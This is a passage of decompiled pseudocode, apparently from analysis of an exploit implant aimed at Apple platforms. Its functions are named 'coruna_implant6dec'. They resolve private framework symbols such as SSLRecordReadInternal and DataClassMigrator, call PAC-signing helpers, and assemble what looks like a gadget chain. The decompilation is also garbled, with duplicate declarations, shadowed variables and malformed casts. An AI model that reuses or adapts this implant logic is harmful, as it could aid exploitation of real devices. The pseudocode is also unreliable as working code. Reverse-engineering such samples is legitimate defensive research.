    *copy = coruna_u64_pack((scratch), (scratch));
    copy[3] = host_info;
    copy[2] = thread_attr;
    err = true;
  }
  str = (long *)ptr[7];
  if (str != (long *)0x0) {
    block = (uint32_t *)0x0;
    data = (uint32_t *)0x0;
    buf = (void *)0x0;
    do {
      obj = data;
      ptr = buf;
      if (str[6] == 0xffff1102888122) {
        if (data == block) {
          ls23 = (long)block - (long)buf;
          kind = (long)ls23 >> 2;
          u = kind + 1;
          if (u >> 0x3e != 0) {
            coruna_abort_87cc();
fail:
            coruna_abort();
          }
          if (u <= (unsigned long)((long)ls23 >> 1)) {
            u = (long)ls23 >> 1;
          }
          if (0x1ffffffffffffffe < kind) {
            u = 0x3fffffffffffffff;
          }
          if (u == 0) {
            ptr = (void *)0x0;
          }
          else {
            if (u >> 0x3e != 0) goto fail;
            ptr = operator_new(u << 2);
          }
          block = (uint32_t *)((long)ptr + kind * 4);
          obj = block + 1;
          *block = (int)str[2];
          if (0 < (long)ls23) {
            _memcpy(ptr,buf,ls23);
          }
          block = (uint32_t *)((long)ptr + u * 4);
          if (buf != (void *)0x0) {
            operator_delete(buf);
          }
        }
        else {
          obj = data + 1;
          *data = (int)str[2];
        }
      }
      str = (long *)*str;
      data = obj;
      buf = ptr;
    } while (str != (long *)0x0);
    if (ptr != (void *)0x0) {
      operator_delete(ptr);
    }
  }
  if (err) {
    if (((handle != (long *)0x0) && (*handle != 0)) &&
       ((handle[1] != 0 && ((int)handle[2] != 0)))) {
      coruna_macho_data_seg(&path_buf,ptr);
      err = coruna_implant6dec_via_implant6dec_via_cat_2(&path_buf);
      if ((err == 0) && (err = coruna_implant6dec_via_implant6dec_via_cat_2_2(&path_buf), err == 0)) {
        coruna_implant6dec_via_vm_deallocate_3(*ptr);
      }
      coruna_implant6dec_via_dlclose(&path_buf);
    }
    coruna_implant6dec_residual_80(ptr);
  }
  else {
    coruna_implant6dec_residual_80(ptr);
  }
  if (*(long *)k_implant_stack_chk_guard_slot != url_buf) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_implant6dec_residual_80(void *ctx)
{
  if (ctx != (void *)0x0) {
    if (*(void **)((long)ctx + 0x10) != (void *)0x0) {
      _free(*(void **)((long)ctx + 0x10));
    }
    if (*(void **)((long)ctx + 8) != (void *)0x0) {
      _free(*(void **)((long)ctx + 8));
    }
    coruna_implant6dec_residual_86((long)ctx + 0x78);
    coruna_implant6dec_residual_86((long)ctx + 0x50);
    coruna_implant6dec_residual_88((long)ctx + 0x28);
    operator_delete(ctx);
  }
  return;
}
void coruna_implant6dec_via_memcpy_ba98_2(uint64_t val)
{
  uint64_t u;
  uint8_t *ptr;
  uint64_t size;
  void *ptr;
  long handle;
  uint64_t *scratch;
  uint64_t *bootargs;
  uint64_t *thread_attr;
  uint64_t *host_info;
  uint64_t *serial_buf;
  uint64_t *action;
  uint64_t *block_ctx;
  uint64_t *stack_guard;
  uint64_t *sa_saved;
  uint64_t *sa_new;
  uint64_t *path_buf;
  uint64_t *tmp_buf;
  uint32_t region[2];
  uint8_t plist[24];
  uint32_t url_buf;
  uint8_t json_buf[24];
  uint32_t frame;
  uint8_t work[24];
  uint32_t cache;
  long cache_20 [4];
  
  cache_20[3] = *(long *)k_implant_stack_chk_guard_slot;
  sa_new = operator_new(0xa0);
  size = k_implant_rodata_word_000147a8;
  ptr = PTR_s__OBJC_CLASS___DataClassMigrator_000147a0;
  u = k_implant_import_slot_2c;
  path_buf = sa_new + 0x14;
  sa_new[0xd] = PTR_s__System_Library_PrivateFramework_00014798;
  sa_new[0xc] = u;
  sa_new[0xf] = size;
  sa_new[0xe] = ptr;
  size = k_implant_rodata_word_000147c8;
  ptr = PTR_s__SSLRecordReadInternal_000147c0;
  u = k_implant_import_slot_2d;
  sa_new[0x11] = PTR_s__System_Library_Frameworks_Secur_000147b8;
  sa_new[0x10] = u;
  sa_new[0x13] = size;
  sa_new[0x12] = ptr;
  size = k_implant_rodata_word_00014768;
  ptr = PTR_s___ZGVZN7WebCore24FloatingPointEn_00014760;
  u = k_implant_import_slot_2a;
  sa_new[5] = PTR_s__System_Library_PrivateFramework_00014758;
  sa_new[4] = u;
  sa_new[7] = size;
  sa_new[6] = ptr;
  size = k_implant_rodata_word_00014788;
  ptr = PTR_s__softLinkEXGetExtensionContextIn_00014780;
  u = k_implant_import_slot_2b;
  sa_new[9] = PTR_s__System_Library_Frameworks_Found_00014778;
  sa_new[8] = u;
  sa_new[0xb] = size;
  sa_new[10] = ptr;
  size = k_implant_rodata_word_00014748;
  ptr = PTR_s__rng_00014740;
  u = k_implant_import_slot_29;
  sa_new[1] = PTR_s__usr_lib_system_libsystem_c_dyli_00014738;
  *sa_new = u;
  sa_new[3] = size;
  sa_new[2] = ptr;
  region[0] = 0;
  tmp_buf = path_buf;
  coruna_memcpy_ba98(plist,&sa_new);
  block_ctx = operator_new(0x40);
  size = k_implant_rodata_word_000147e8;
  ptr = PTR_s__tls_handshake_init_pending_ciph_000147e0;
  u = k_implant_import_slot_2e;
  stack_guard = block_ctx + 8;
  block_ctx[1] = PTR_s__System_Library_Frameworks_Secur_000147d8;
  *block_ctx = u;
  block_ctx[3] = size;
  block_ctx[2] = ptr;
  size = k_implant_rodata_word_00014808;
  ptr = PTR_s__SSLRecordReadInternal_00014800;
  u = k_implant_import_slot_2f;
  block_ctx[5] = PTR_s__System_Library_Frameworks_Secur_000147f8;
  block_ctx[4] = u;
  block_ctx[7] = size;
  block_ctx[6] = ptr;
  url_buf = 1;
  sa_saved = stack_guard;
  coruna_memcpy_ba98(json_buf,&block_ctx);
  host_info = operator_new(0x20);
  size = k_implant_rodata_word_00014828;
  ptr = PTR_s_____NSExtensionContextInternalCl_00014820;
  u = k_implant_import_slot_30;
  serial_buf = host_info + 4;
  host_info[1] = PTR_s__System_Library_Frameworks_Found_00014818;
  *host_info = u;
  host_info[3] = size;
  host_info[2] = ptr;
  frame = 2;
  action = serial_buf;
  coruna_memcpy_ba98(work,&host_info);
  scratch = operator_new(0x20);
  size = k_implant_rodata_word_00014848;
  ptr = PTR_s_dataClassMigratorForBundleAtPath_00014840;
  u = k_implant_import_slot_31;
  bootargs = scratch + 4;
  scratch[1] = PTR_s__System_Library_PrivateFramework_00014838;
  *scratch = u;
  scratch[3] = size;
  scratch[2] = ptr;
  cache = 3;
  thread_attr = bootargs;
  coruna_memcpy_ba98(cache_20,&scratch);
  coruna_implant6dec_via_cat(val,region,4);
  handle = 0;
  do {
    ptr = *(void **)((long)cache_20 + handle);
    if (ptr != (void *)0x0) {
      *(void **)((long)cache_20 + handle + 8) = ptr;
      operator_delete(ptr);
    }
    handle = handle + -0x20;
  } while (handle != -0x80);
  if (scratch != (uint64_t *)0x0) {
    bootargs = scratch;
    operator_delete(scratch);
  }
  if (host_info != (uint64_t *)0x0) {
    serial_buf = host_info;
    operator_delete(host_info);
  }
  if (block_ctx != (uint64_t *)0x0) {
    stack_guard = block_ctx;
    operator_delete(block_ctx);
  }
  if (sa_new != (uint64_t *)0x0) {
    path_buf = sa_new;
    operator_delete(sa_new);
  }
  if (*(long *)k_implant_stack_chk_guard_slot != cache_20[3]) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_implant6dec_residual_81(long handle,uint64_t val)
{
  long handle;
  int err;
  void (*ptr)(void);
  long *ptr;
  
  ptr = *(long **)(handle + 0x10);
  do {
    if (ptr == (long *)0x0) {
      return;
    }
    if (ptr[4] != ptr[3]) {
      err = *(int *)(ptr + 2);
      ptr = coruna_implant6dec_via_implant6dec_str_auth_const;
      if (err < 2) {
        if (err == 0) {
          ptr = coruna_dlclose_1041c;
        }
        else if (err != 1) {
fail:
          coruna_implant6dec_residual_82(val);
          return;
        }
      }
      else if (err == 3) {
        ptr = coruna_sel_registername;
      }
      else {
        if (err != 2) goto fail;
        ptr = coruna_implant6dec_via_implant6dec_via_implant6dec_str_auth_const;
      }
      coruna_implant6dec_via_pacia_3(ptr,0);
      handle = ptr[3];
      if (handle != ptr[4]) {
        coruna_implant6dec_via_pacia_3_3(*(uint64_t *)(handle + 8),*(uint64_t *)(handle + 0x10));
      }
    }
    ptr = (long *)*ptr;
  } while( true );
}
void coruna_implant6dec_via_cat_2(long *handle,uint *size)
{
  uint u;
  unsigned long size;
  unsigned long version;
  long handle;
  long *ptr;
  unsigned long port;
  long *buf;
  unsigned long tag;
  unsigned long kind;
  unsigned long unaff_x23;
  uint16_t type_id;
  uint64_t type_id_8;
  
  u = *size;
  kind = (unsigned long)u;
  tag = handle[1];
  if (tag != 0) {
    type_id_8 = coruna_cat(POPCOUNT((char)(tag >> 0x38)),
                      coruna_cat(POPCOUNT((char)(tag >> 0x30)),
                               coruna_cat(POPCOUNT((char)(tag >> 0x28)),
                                        coruna_u64_pack14((POPCOUNT((char)(tag >> 0x20))), (coruna_cat(POPCOUNT((char))(tag >> 0x18)),
                                                          coruna_cat(POPCOUNT((char)(tag >> 0x10)),
                                                                   coruna_cat(POPCOUNT((char)(tag >>
                                                                                           8)),
                                                                            POPCOUNT((char)tag))))
                                                ))));
    type_id = NEON_uaddlv(type_id_8,1);
    version = coruna_cat((int6)((unsigned long)type_id_8 >> 0x10),type_id) & 0xffffffff;
    if (version < 2) {
      unaff_x23 = (unsigned long)((int)tag - 1U & u);
    }
    else {
      unaff_x23 = kind;
      if (tag <= kind) {
        port = 0;
        if (tag != 0) {
          port = kind / tag;
        }
        unaff_x23 = kind - port * tag;
      }
    }
    buf = *(long **)(*handle + unaff_x23 * 8);
    if (buf != (long *)0x0) {
      while (buf = (long *)*buf, buf != (long *)0x0) {
        port = buf[1];
        if (port != kind) {
          if (version < 2) {
            port = port & tag - 1;
          }
          else if (tag <= port) {
            size = 0;
            if (tag != 0) {
              size = port / tag;
            }
            port = port - size * tag;
          }
          if (port != unaff_x23) break;
        }
        if (*(uint *)(buf + 2) == u) {
          return;
        }
      }
    }
  }
  buf = operator_new(0x38);
  *(uint *)(buf + 2) = u;
  buf[4] = 0;
  buf[3] = 0;
  buf[6] = 0;
  buf[5] = 0;
  *buf = 0;
  buf[1] = kind;
  if (*(float *)(handle + 4) * (float)tag < (float)(handle[3] + 1) || tag == 0) {
    version = 1;
    if (2 < tag) {
      version = (unsigned long)((tag & tag - 1) != 0);
    }
    version = version | tag << 1;
    tag = (unsigned long)((float)(handle[3] + 1) / *(float *)(handle + 4));
    if (tag <= version) {
      tag = version;
    }
    coruna_implant6dec_via_cat_3(handle,tag);
    tag = handle[1];
    if ((tag & tag - 1) == 0) {
      unaff_x23 = (unsigned long)((int)tag - 1U & u);
    }
    else {
      unaff_x23 = kind;
      if (tag <= kind) {
        version = 0;
        if (tag != 0) {
          version = kind / tag;
        }
        unaff_x23 = kind - version * tag;
      }
    }
  }
  handle = *handle;
  ptr = *(long **)(handle + unaff_x23 * 8);
  if (ptr == (long *)0x0) {
    ptr = handle + 2;
    *buf = *ptr;
    *ptr = (long)buf;
    *(long **)(handle + unaff_x23 * 8) = ptr;
    if (*buf != 0) {
      kind = *(unsigned long *)(*buf + 8);
      if ((tag & tag - 1) == 0) {
        kind = kind & tag - 1;
      }
      else if (tag <= kind) {
        version = 0;
        if (tag != 0) {
          version = kind / tag;
        }
        kind = kind - version * tag;
      }
      *(long **)(*handle + kind * 8) = buf;
    }
  }
  else {
    *buf = *ptr;
    *ptr = (long)buf;
  }
  handle[3] = handle[3] + 1;
  return;
}
void coruna_implant6dec_residual_82(long *handle)
{
  uint64_t *ptr;
  long handle;
  long addr;
  void *ptr;
  
  if (handle[3] != 0) {
    ptr = (void *)handle[2];
    while (ptr != (void *)0x0) {
      ptr = (void *)*ptr;
      operator_delete(ptr);
      ptr = ptr;
    }
    handle[2] = 0;
    handle = handle[1];
    if (handle != 0) {
      addr = 0;
      do {
        *(uint64_t *)(*handle + addr * 8) = 0;
        addr = addr + 1;
      } while (handle != addr);
    }
    handle[3] = 0;
  }
  return;
}
void coruna_implant6dec_via_cat_3(long handle,unsigned long arg)
{
  unsigned long u;
  unsigned long size;
  uint16_t version;
  uint64_t port;
  
  if (arg - 1 == 0) {
    arg = 2;
  }
  else if ((arg & arg - 1) != 0) {
    arg = std___next_prime(arg);
  }
  size = *(unsigned long *)(handle + 8);
  u = arg;
  if (arg <= size) {
    if (size <= arg) {
      return;
    }
    u = (unsigned long)((float)*(unsigned long *)(handle + 0x18) / *(float *)(handle + 0x20));
    if ((size < 3) ||
       (port = coruna_cat(POPCOUNT((char)(size >> 0x38)),
                         coruna_cat(POPCOUNT((char)(size >> 0x30)),
                                  coruna_cat(POPCOUNT((char)(size >> 0x28)),
                                           coruna_u64_pack14((POPCOUNT((char)(size >> 0x20))), (coruna_cat(POPCOUNT((char))(size >> 0x18)),
                                                             coruna_cat(POPCOUNT((char)(size >> 0x10)
                                                                              ),
                                                                      coruna_cat(POPCOUNT((char)(size
                                                                                              >> 8))
                                                                               ,POPCOUNT((char)size
                                                                                        )))))))),
       version = NEON_uaddlv(port,1), 1 < (uint)coruna_cat((int6)((unsigned long)port >> 0x10),version))) {
      u = std___next_prime(u);
    }
    else if (1 < u) {
      u = 1L << (-LZCOUNT(u - 1) & 0x3fU);
    }
    if (u <= arg) {
      u = arg;
    }
    if (size <= u) {
      return;
    }
  }
  coruna_implant6dec_via_cat_4(handle,u);
  return;
}





void coruna_abort(void)
{
  _abort();
}
void coruna_implant6dec_via_cat_4(long *handle,unsigned long arg)
{
  unsigned long u;
  void *ptr;
  void *buf;
  unsigned long size;
  long *str;
  long *copy;
  unsigned long version;
  long *data;
  unsigned long port;
  long *obj;
  uint16_t tag;
  uint64_t kind;
  
  if (arg == 0) {
    ptr = (void *)*handle;
    *handle = 0;
    if (ptr != (void *)0x0) {
      operator_delete(ptr);
    }
    handle[1] = 0;
  }
  else {
    if (arg >> 0x3d != 0) {
      coruna_abort();
    }
    ptr = operator_new(arg << 3);
    buf = (void *)*handle;
    *handle = (long)ptr;
    if (buf != (void *)0x0) {
      operator_delete(buf);
    }
    size = 0;
    handle[1] = arg;
    do {
      *(uint64_t *)(*handle + size * 8) = 0;
      size = size + 1;
    } while (arg != size);
    str = (long *)handle[2];
    if (str != (long *)0x0) {
      size = str[1];
      kind = coruna_cat(POPCOUNT((char)(arg >> 0x38)),
                        coruna_cat(POPCOUNT((char)(arg >> 0x30)),
                                 coruna_cat(POPCOUNT((char)(arg >> 0x28)),
                                          coruna_u64_pack14((POPCOUNT((char)(arg >> 0x20))), (coruna_cat(POPCOUNT((char))(arg >> 0x18)),
                                                            coruna_cat(POPCOUNT((char)(arg >> 0x10
                                                                                    )),
                                                                     coruna_cat(POPCOUNT((char)(
                                                  arg >> 8)),POPCOUNT((char)arg))))))));
      tag = NEON_uaddlv(kind,1);
      version = coruna_cat((int6)((unsigned long)kind >> 0x10),tag) & 0xffffffff;
      if (version < 2) {
        size = size & arg - 1;
      }
      else if (arg <= size) {
        port = 0;
        if (arg != 0) {
          port = size / arg;
        }
        size = size - port * arg;
      }
      *(long **)(*handle + size * 8) = handle + 2;
      if ((long *)*str != (long *)0x0) {
        copy = (long *)*str;
        do {
          port = copy[1];
          if (version < 2) {
            port = port & arg - 1;
          }
          else if (arg <= port) {
            u = 0;
            if (arg != 0) {
              u = port / arg;
            }
            port = port - u * arg;
          }
          if (port != size) {
            data = copy;
            if (*(long *)(*handle + port * 8) == 0) {
              *(long **)(*handle + port * 8) = str;
              size = port;
            }
            else {
              do {
                obj = data;
                data = (long *)*obj;
                if (data == (long *)0x0) break;
              } while ((int)copy[2] == (int)data[2]);
              *str = (long)data;
              *obj = **(long **)(*handle + port * 8);
              **(uint64_t **)(*handle + port * 8) = copy;
              copy = str;
            }
          }
          data = (long *)*copy;
          str = copy;
          copy = data;
        } while (data != (long *)0x0);
      }
    }
  }
  return;
}





void coruna_abort_87cc(void)
{
  _abort();
}
void coruna_implant6dec_via_implant6dec_via_cat_2(long *handle)
{
  long *ptr;
  long *buf;
  long handle;
  long *str;
  uint64_t u;
  uint64_t size;
  long addr;
  uint64_t version;
  long *copy;
  uint64_t port;
  uint32_t scratch;
  void *bootargs;
  void *thread_attr;
  uint32_t host_info;
  void *serial_buf;
  void *action;
  long *block_ctx;
  long *stack_guard;
  long *sa_saved;
  long *sa_new;
  long *path_buf;
  long *tmp_buf;
  long *region;
  long *plist;
  long *url_buf;
  long json_buf [11];
  
  json_buf[9] = *(long *)k_implant_stack_chk_guard_slot;
  block_ctx = (long *)coruna_u64_pack((block_ctx), (0x29));
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&block_ctx);
  addr = *(long *)(handle + 0x18);
  copy = handle + 0x1d;
  sa_new = (long *)coruna_u64_pack((sa_new), (0x21));
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),0,addr + -0x20);
  ptr = handle + 0x1f;
  tmp_buf = (long *)((long)handle + 0x5a);
  sa_new = (long *)((long)handle + 0x4d);
  path_buf = copy;
  region = ptr;
  block_ctx = operator_new(0x20);
  stack_guard = block_ctx + 4;
  block_ctx[1] = (long)path_buf;
  *block_ctx = (long)sa_new;
  block_ctx[3] = (long)region;
  block_ctx[2] = (long)tmp_buf;
  sa_saved = stack_guard;
  coruna_memcpy_b274(&serial_buf,&block_ctx);
  coruna_implant6dec_via_implant6dec_via_cat_2_3(handle,&serial_buf,1);
  if (serial_buf != (void *)0x0) {
    action = serial_buf;
    operator_delete(serial_buf);
  }
  json_buf[0] = handle[0x5e];
  sa_new = handle + 0x22;
  path_buf = handle + 0x29;
  tmp_buf = handle + 0x2f;
  region = handle + 0x35;
  plist = handle + 0x3f;
  url_buf = handle + 0x43;
  str = operator_new(0x38);
  handle = 0;
  str[1] = (long)path_buf;
  *str = (long)sa_new;
  str[3] = (long)region;
  str[2] = (long)tmp_buf;
  str[5] = (long)url_buf;
  str[4] = (long)plist;
  str[6] = json_buf[0];
  do {
    u = coruna_sleep(handle,ptr);
    size = coruna_sleep(handle,*(uint64_t *)((long)str + handle));
    sa_new = (long *)coruna_u64_pack((sa_new), (8));
    addr = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
    coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,u,size,*(uint64_t *)(addr + 0x18));
    handle = handle + 8;
  } while (handle != 0x38);
  sa_new = 0x1b;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  u = *(uint64_t *)(handle + 0x18);
  host_info = 0x2c;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  coruna_implant6dec_via_sleep(handle,u,*(uint64_t *)(handle + 0x18));
  u = coruna_sleep(handle,copy);
  sa_new = (long *)coruna_u64_pack((sa_new), (0x2c));
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  port = *(uint64_t *)(handle + 0x18);
  host_info = 0x31;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  version = *(uint64_t *)(handle + 0x18);
  size = coruna_sleep(handle,handle + 0x35);
  coruna_implant6dec_via_implant6dec_via_cat_2_5(handle,u,port,version,size);
  sa_new = handle + 8;
  path_buf = handle + 0x1e;
  tmp_buf = (long *)((long)handle + 0x6a);
  region = handle + 0x20;
  plist = (long *)((long)handle + 0x91);
  url_buf = handle + 0x21;
  coruna_implant6dec_via_abort_b268_2(&block_ctx,&sa_new,json_buf);
  coruna_memcpy_b274(&bootargs,&block_ctx);
  coruna_implant6dec_via_implant6dec_via_cat_2_3(handle,&bootargs,0);
  if (bootargs != (void *)0x0) {
    thread_attr = bootargs;
    operator_delete(bootargs);
  }
  u = coruna_sleep(handle,ptr);
  size = coruna_sleep(handle,handle + 0x50);
  sa_new = 9;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,u,size,*(uint64_t *)(handle + 0x18));
  u = coruna_sleep(handle,handle + 0x51);
  host_info = 0x17;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  size = *(uint64_t *)(handle + 0x18);
  sa_new = 0x12;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),size,u);
  sa_new = 0x16;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  addr = *(long *)(handle + 0x18);
  sa_new = 0x21;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),addr + -0x18,addr + -0x38);
  sa_new = (long *)coruna_u64_pack((sa_new), (0x21));
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),0,addr + -0x30);
  sa_new = (long *)0xffffffffffffffff;
  path_buf = (long *)0xffffffffffffffff;
  region = (long *)0x0;
  tmp_buf = (long *)0x0;
  url_buf = (long *)0x0;
  plist = (long *)0x0;
  json_buf[1] = 0;
  json_buf[0] = 0;
  json_buf[3] = 0;
  json_buf[2] = 0;
  json_buf[5] = 0;
  json_buf[4] = 0;
  json_buf[7] = 0;
  json_buf[8] = 0;
  json_buf[6] = 0xffffffffffffffff;
  coruna_implant6dec_via_abort_ada4(handle + 0x58,&sa_new);
  addr = handle[0x59];
  handle = coruna_sleep(handle,addr + -0x78);
  handle[0x52] = handle;
  u = coruna_sleep(handle,copy);
  size = coruna_sleep(handle,handle + 0x50);
  sa_new = 0x27;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  version = *(uint64_t *)(handle + 0x18);
  host_info = 0x24;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  coruna_implant6dec_via_implant6dec_via_cat_2_6(handle,u,size,version,*(uint64_t *)(handle + 0x18),0,0);
  u = coruna_sleep(handle,copy);
  sa_new = 0xd;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  version = *(uint64_t *)(handle + 0x18);
  host_info = 0x26;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  port = *(uint64_t *)(handle + 0x18);
  size = coruna_sleep(handle,handle + 0x2f);
  coruna_implant6dec_via_implant6dec_via_cat_2_5(handle,u,version,port,size);
  handle[0x61] = addr + -0x78;
  host_info = 0x2a;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  addr = *(long *)(handle + 0x18);
  sa_new = 0x21;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),0,addr + -0x20);
  sa_new = 0x1b;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  u = *(uint64_t *)(handle + 0x18);
  host_info = 0x10;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  coruna_implant6dec_via_sleep(handle,u,*(uint64_t *)(handle + 0x18));
  sa_new = 3;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_7(handle,*(uint64_t *)(handle + 0x18));
  host_info = 4;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  size = *(uint64_t *)(handle + 0x18);
  u = coruna_sleep(handle,handle + 0x20);
  sa_new = 0x12;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),u,size);
  handle = coruna_sleep(handle,handle + 0x4d);
  host_info = 0x10;
  addr = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  u = *(uint64_t *)(addr + 0x18);
  sa_new = 0x21;
  addr = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(addr + 0x18),u,handle + -0x20);
  handle = coruna_sleep(handle,handle + 0x4f);
  host_info = 0x26;
  addr = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  u = *(uint64_t *)(addr + 0x18);
  sa_new = 0x21;
  addr = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(addr + 0x18),u,handle + -0x20);
  ptr = handle + 0x53;
  handle = coruna_sleep(handle,ptr);
  sa_new = 0x1f;
  addr = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  version = *(uint64_t *)(addr + 0x18);
  u = coruna_sleep(handle,handle + 0x47);
  size = coruna_sleep(handle,handle + 0x29);
  coruna_implant6dec_via_implant6dec_via_cat_2_5(handle,version,handle + -0x10,u,size);
  host_info = 6;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  addr = *(long *)(handle + 0x18);
  u = coruna_sleep(handle,(long)handle + 0xbd);
  sa_new = 0x21;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),u,addr + -0x10);
  host_info = 5;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  u = *(uint64_t *)(handle + 0x18);
  scratch = 0x14;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&scratch);
  size = *(uint64_t *)(handle + 0x18);
  sa_new = 0x12;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),size,u);
  handle = coruna_sleep(handle,(long)handle + 0xd5);
  handle[0x57] = handle;
  host_info = 0x30;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  addr = *(long *)(handle + 0x18);
  u = coruna_sleep(handle,handle + 0x55);
  sa_new = 0x21;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),u,addr + -8);
  host_info = 0x2b;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  size = *(uint64_t *)(handle + 0x18);
  u = coruna_sleep(handle,handle + 0x21);
  sa_new = 0x12;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),u,size);
  u = coruna_sleep(handle,handle + 0x4d);
  size = coruna_sleep(handle,ptr);
  sa_new = 0x12;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),size,u);
  buf = handle + 0x54;
  handle = coruna_sleep(handle,buf);
  sa_new = 0x1f;
  addr = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  version = *(uint64_t *)(addr + 0x18);
  u = coruna_sleep(handle,handle + 0x47);
  size = coruna_sleep(handle,handle + 0x22);
  coruna_implant6dec_via_implant6dec_via_cat_2_5(handle,version,handle + -0x10,u,size);
  u = coruna_sleep(handle,buf);
  sa_new = 0x12;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),u,0xffff101360adf);
  u = coruna_sleep(handle,copy);
  sa_new = 0x28;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  version = *(uint64_t *)(handle + 0x18);
  host_info = 0x23;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  port = *(uint64_t *)(handle + 0x18);
  size = coruna_sleep(handle,handle + 0x3f);
  coruna_implant6dec_via_implant6dec_via_implant6dec_via_cat_2_5(handle,u,0xfffffda063101,version,port,size);
  u = coruna_sleep(handle,buf);
  sa_new = 0x12;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),u,0xffff101360adf);
  u = coruna_sleep(handle,copy);
  sa_new = 0x28;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  version = *(uint64_t *)(handle + 0x18);
  host_info = 0x30;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&host_info);
  port = *(uint64_t *)(handle + 0x18);
  size = coruna_sleep(handle,handle + 0x43);
  coruna_implant6dec_via_implant6dec_via_implant6dec_via_cat_2_5(handle,u,0xfffffda063101,version,port,size);
  u = coruna_sleep(handle,ptr);
  sa_new = 0x12;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),u,0xffff101360adf);
  u = coruna_sleep(handle,copy);
  sa_new = (long *)coruna_u64_pack((sa_new), (0x25));
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&sa_new);
  version = *(uint64_t *)(handle + 0x18);
  size = coruna_sleep(handle,handle[0x5e]);
  coruna_implant6dec_via_implant6dec_via_cat_2_5(handle,u,0xfffffda063101,version,size);
  operator_delete(str);
  if (block_ctx != (long *)0x0) {
    stack_guard = block_ctx;
    operator_delete(block_ctx);
  }
  if (*(long *)k_implant_stack_chk_guard_slot != json_buf[9]) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_implant6dec_via_implant6dec_via_cat_2_2(long *handle)
{
  int err;
  long handle;
  uint64_t u;
  uint32_t scratch;
  long bootargs;
